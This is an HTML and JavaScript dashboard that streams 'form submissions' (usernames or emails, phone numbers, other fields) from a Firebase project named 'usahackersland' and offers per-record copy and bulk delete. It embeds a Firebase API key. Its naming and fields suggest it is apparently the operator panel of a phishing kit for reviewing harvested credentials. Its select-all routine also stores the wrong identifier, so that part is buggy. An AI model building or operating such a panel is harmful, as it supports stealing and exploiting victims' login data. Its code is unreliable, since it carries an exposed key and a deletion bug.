<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ğŸ“Š Submissions Dashboard</title>
<style>
body{font-family:Arial,sans-serif;background:#f4f6f8;padding:20px}
.container{max-width:1200px;margin:auto;background:#fff;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1)}
h2{text-align:center;margin-bottom:20px}
table{width:100%;border-collapse:collapse;margin-top:20px}
th,td{border:1px solid #ccc;padding:10px;text-align:left;vertical-align:top}
th{background:#1976d2;color:#fff}
tr:nth-child(even){background:#f1f1f1}
button{padding:6px 10px;margin:2px;border:none;border-radius:5px;cursor:pointer}
button.copy{background:#4caf50;color:#fff}
button.delete{background:#f44336;color:#fff}
button.selectAll{background:#1976d2;color:#fff}
button.deleteAll{background:#d32f2f;color:#fff}
</style>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>
<body>
<div class="container">
<h2>ğŸ“Š Form Submissions Dashboard</h2>
<div>
<button class="selectAll" onclick="selectAll()">Select All âœ…</button>
<button class="deleteAll" onclick="deleteSelected()">Delete Selected ğŸ—‘ï¸</button>
</div>
<table>
<thead>
<tr>
<th>Select</th>
<th>Form ID</th>
<th>Username / Email</th>
<th>Phone</th>
<th>Other Fields</th>
<th>Time</th>
<th>Actions</th>
</tr>
</thead>
<tbody id="submissionBody"></tbody>
</table>
</div>

<script>
const $ = id => document.getElementById(id);
const firebaseConfig = {
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

let selected = new Set();

// Render submissions grouped by document
function renderTable(submissions){
  const tbody = $("submissionBody");
  tbody.innerHTML = "";

  submissions.forEach(doc=>{
    const data = doc.data().data;
    const formId = doc.data().formId;
    const createdAt = new Date(doc.data().createdAt).toLocaleString();

    const username = data.username || data.email || "-";
    const phone = data["Phone Number"] || "-";

    // Other fields (exclude username/email/phone)
    const otherFields = Object.entries(data)
      .filter(([k,_])=>!["username","email","Phone Number"].includes(k))
      .map(([k,v])=>`${k}: ${v}`).join("\n");

    const tr = document.createElement("tr");

    // Select checkbox
    const selectTd = document.createElement("td");
    const checkbox = document.createElement("input");
    checkbox.type="checkbox";
    checkbox.onchange = e=>{
      if(e.target.checked) selected.add(doc.id);
      else selected.delete(doc.id);
    };
    selectTd.appendChild(checkbox);
    tr.appendChild(selectTd);

    const formTd = document.createElement("td");
    formTd.textContent = formId;
    tr.appendChild(formTd);

    const userTd = document.createElement("td");
    userTd.textContent = username;
    tr.appendChild(userTd);

    const phoneTd = document.createElement("td");
    phoneTd.textContent = phone;
    tr.appendChild(phoneTd);

    const otherTd = document.createElement("td");
    otherTd.textContent = otherFields;
    tr.appendChild(otherTd);

    const timeTd = document.createElement("td");
    timeTd.textContent = createdAt;
    tr.appendChild(timeTd);

    const actionTd = document.createElement("td");

    // Copy all
    const copyBtn = document.createElement("button");
    copyBtn.textContent = "Copy All ğŸ“‹";
    copyBtn.className="copy";
    copyBtn.onclick = ()=>{
      let text = `Form ID: ${formId}\nUsername/Email: ${username}\nPhone: ${phone}\n${otherFields}\nTime: ${createdAt}`;
      navigator.clipboard.writeText(text);
    };
    actionTd.appendChild(copyBtn);

    // Delete submission
    const deleteBtn = document.createElement("button");
    deleteBtn.textContent = "Delete ğŸ—‘ï¸";
    deleteBtn.className="delete";
    deleteBtn.onclick = ()=>db.collection("submissions").doc(doc.id).delete();
    actionTd.appendChild(deleteBtn);

    tr.appendChild(actionTd);

    tbody.appendChild(tr);
  });
}

// Select all submissions
function selectAll(){
  document.querySelectorAll("tbody input[type=checkbox]").forEach(cb=>{
    cb.checked=true;
    const tr = cb.closest("tr");
    const docId = tr.children[1].textContent;
    selected.add(docId);
  });
}

// Delete selected submissions
function deleteSelected(){
  selected.forEach(docId=>{
    db.collection("submissions").doc(docId).delete();
  });
  selected.clear();
}

// Listen live submissions
db.collection("submissions").orderBy("createdAt","desc").onSnapshot(snap=>{
  const submissions = [];
  snap.forEach(doc=>submissions.push(doc));
  renderTable(submissions);
});
</script>
</body>
</html>
